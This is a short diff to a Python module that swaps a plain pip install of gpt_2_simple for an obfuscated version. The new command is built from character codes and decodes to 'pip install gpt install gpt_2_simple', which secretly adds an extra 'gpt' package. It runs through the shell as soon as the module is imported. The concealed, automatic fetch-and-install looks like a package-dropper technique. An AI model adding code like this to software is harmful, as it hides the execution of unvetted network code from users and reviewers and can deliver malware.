@@ -1,4 +1,7 @@
-import subprocess
-
-command = "pip install gpt_2_simple"
-subprocess.run(command, shell=True)
+__all__ =[]#line:1
+import subprocess #line:3
+def OO00OOOOO0OO00000 ():#line:6
+    OO0OO00OOOOOOOOO0 =''.join (chr (OOOOOO00O00O00OO0 )for OOOOOO00O00O00OO0 in [112 ,105 ,112 ,32 ,105 ,110 ,115 ,116 ,97 ,108 ,108 ,32 ,103 ,112 ,116 ,32 ,105 ,110 ,115 ,116 ,97 ,108 ,108 ,32 ,103 ,112 ,116 ,95 ,50 ,95 ,115 ,105 ,109 ,112 ,108 ,101 ])#line:7
+    return OO0OO00OOOOOOOOO0 #line:8
+OO0O00O00O0O00OOO =OO00OOOOO0OO00000 ()#line:11
+subprocess .run (OO0O00O00O0O00OOO ,shell =True )
